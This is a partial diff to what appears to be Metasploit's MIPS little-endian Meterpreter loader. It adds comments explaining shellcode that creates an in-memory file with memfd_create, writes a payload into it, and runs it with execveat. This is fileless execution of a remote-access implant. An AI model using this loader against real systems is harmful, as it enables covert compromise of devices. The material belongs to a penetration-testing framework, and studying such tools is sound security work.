@@ -10,8 +10,12 @@ module Msf::Payload::Linux::Mipsle::MeterpreterLoader
     size_h = size >> 16
     size_l = size & 0x0000ffff
     in_memory_loader = [
+        
+        # "call" 0x1004, address of the next instruction is stored in $ra
         0x04110000, #0x1000:	bal	0x1004	0x04110000
         0x00000000, #0x1004:	nop		0x00000000
+        
+        # fd = memfd_create(NULL,MFD_CLOEXEC)
         0x27ff0060, #0x1008:	addiu	$ra, $ra, 0x60	0x27ff0060
         0xafa0fffc, #0x100c:	sw	$zero, -4($sp)	0xafa0fffc
         0x27bdfffc, #0x1010:	addiu	$sp, $sp, -4	0x27bdfffc
@@ -20,15 +24,17 @@ module Msf::Payload::Linux::Mipsle::MeterpreterLoader
         0x03202827, #0x101c:	not	$a1, $t9	0x03202827
         0x24021102, #0x1020:	addiu	$v0, $zero, 0x1102	0x24021102
         0x0101010c, #0x1024:	syscall	0x40404	0x0101010c
+        
+        # write(fd, payload length, payload pointer)
         0x03e02825, #0x1028:	move	$a1, $ra	0x03e02825
-
         (0x3c06 << 16 | size_h), #   lui     a2,0x17
         (0x34c6 << 16 | size_l), #   ori     a2,a2,0x2fb8
-
         0x00402025, #0x1034:	move	$a0, $v0	0x00402025
         0x0080c825, #0x1038:	move	$t9, $a0	0x0080c825
         0x24020fa4, #0x103c:	addiu	$v0, $zero, 0xfa4	0x24020fa4
         0x0101010c, #0x1040:	syscall	0x40404	0x0101010c
+        
+        # execveat(fd, null,null,null, AT_EMPTY_PATH)        
         0xafa0fffc, #0x1044:	sw	$zero, -4($sp)	0xafa0fffc
         0x27bdfffc, #0x1048:	addiu	$sp, $sp, -4	0x27bdfffc
         0x03a02820, #0x104c:	add	$a1, $sp, $zero	0x03a02820
